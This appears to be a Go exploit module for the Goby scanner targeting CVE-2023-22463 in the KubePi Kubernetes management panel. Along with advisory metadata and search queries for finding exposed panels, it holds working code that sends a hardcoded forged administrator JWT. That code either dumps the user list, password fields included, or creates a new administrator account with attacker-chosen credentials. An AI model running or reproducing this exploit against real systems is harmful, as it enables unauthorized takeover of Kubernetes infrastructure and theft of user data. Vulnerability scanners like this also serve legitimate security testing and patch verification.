package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "KubePi JWT Default Key Permission Bypass Vulnerability (CVE-2023-22463)",
    "Description": "<p>KubePi is a simple and easy-to-use open source Kubernetes visual management panel</p><p>KubePi has a privilege bypass vulnerability, which allows attackers to control the entire platform through the default JWT user and operate core functions with administrator privileges.</p>",
    "Product": "KubePi",
    "Homepage": "https://github.com/1Panel-dev/KubePi",
    "DisclosureDate": "2023-01-04",
    "PostTime": "2023-08-13",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "title=\"KubePi\" || body=\"/kubepi/css/\" || body=\"kubepi doesn't work\" || header=\"KubePi\" || banner=\"KubePi\"",
    "GobyQuery": "title=\"KubePi\" || body=\"/kubepi/css/\" || body=\"kubepi doesn't work\" || header=\"KubePi\" || banner=\"KubePi\"",
    "Level": "3",
    "Impact": "<p>KubePi has a privilege bypass vulnerability, which allows attackers to control the entire platform through the default JWT user and operate core functions with administrator privileges.</p>",
    "Recommendation": "<p>The product has fixed the vulnerability: <a href=\"https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-vjhf-8vqx-vqpq\">https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-vjhf-8vqx-vqpq</a></p><p>1. Modify the default JWT key, preferably containing uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "listUser,addUser",
            "show": ""
        },
        {
            "name": "username",
            "type": "input",
            "value": "o3sjeo",
            "show": "attackType=addUser"
        },
        {
            "name": "password",
            "type": "input",
            "value": "sji0adEvn",
            "show": "attackType=addUser"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2023-22463"
    ],
    "CNNVD": [
        "CNNVD-202301-254"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "KubePi JWT 默认密钥权限绕过漏洞（CVE-2023-22463）",
            "Product": "KubePi",
            "Description": "<p>KubePi 是一款简单易用的开源 Kubernetes 可视化管理面板。</p><p>KubePi 存在权限绕过漏洞，攻击者可通过默认 JWT 密钥获取管理员权限控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>官方已修复该漏洞：<a href=\"https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-vjhf-8vqx-vqpq\" target=\"_blank\">https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-vjhf-8vqx-vqpq</a></p><p>临时解决方案：</p><p>1、修改默认 JWT 密钥，密钥最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>KubePi 存在权限绕过漏洞，攻击者可通过默认 JWT 密钥获取权限控制整个平台，使用管理员权限操作核心的功能。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "KubePi JWT Default Key Permission Bypass Vulnerability (CVE-2023-22463)",
            "Product": "KubePi",
            "Description": "<p>KubePi is a simple and easy-to-use open source Kubernetes visual management panel</p><p>KubePi has a privilege bypass vulnerability, which allows attackers to control the entire platform through the default JWT user and operate core functions with administrator privileges.</p>",
            "Recommendation": "<p>The product has fixed the vulnerability:&nbsp;<a href=\"https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-vjhf-8vqx-vqpq\" target=\"_blank\">https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-vjhf-8vqx-vqpq</a><br></p><p>1. Modify the default JWT key, preferably containing uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>KubePi has a privilege bypass vulnerability, which allows attackers to control the entire platform through the default JWT user and operate core functions with administrator privileges.</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10823"
}`
	sendPayloadJOIUWEOQH := func(hostInfo *httpclient.FixUrl, uri, postData string) (*httpclient.HttpResponse, error) {
		config := httpclient.NewPostRequestConfig(uri)
		config.FollowRedirect = false
		config.VerifyTls = false
		config.Header.Store("Content-Type", "application/json")
		config.Header.Store("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8")
		config.Data = postData
		return httpclient.DoHttpRequest(hostInfo, config)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadJOIUWEOQH(hostInfo, "/kubepi/api/v1/roles/search?pageNum=1&&pageSize=10", "{}")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `"data":`) && strings.Contains(resp.Utf8Html, `"total":`) && strings.Contains(resp.Utf8Html, `"success": true`)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			if attackType == "addUser" {
				username := stepLogs.Params["username"].(string)
				password := stepLogs.Params["password"].(string)
				resp, _ := sendPayloadJOIUWEOQH(expResult.HostInfo, "/kubepi/api/v1/users", fmt.Sprintf(`{"authenticate": {"password": "%s"},"email": "%s@gmail.com","isAdmin": true,"mfa": {"enable": false},"name": "%s","nickName": "%s","roles": ["Supper User"]}`, password, username, username, username))
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `authenticate`) && strings.Contains(resp.Utf8Html, `"isAdmin": true`) && strings.Contains(resp.Utf8Html, `"isAdmin": `) && strings.Contains(resp.Utf8Html, `"createdBy":`) {
          expResult.Output = fmt.Sprintf("username: %s\npassword: %s", username, password)
					expResult.Success = true
				}
			} else if attackType == "listUser" {
				resp ,_ := sendPayloadJOIUWEOQH(expResult.HostInfo, "/kubepi/api/v1/users/search?pageNum=1&&pageSize=10", `{}`)
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `updateAt`) && strings.Contains(resp.Utf8Html, `password`) && strings.Contains(resp.Utf8Html, `"success": true`){
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
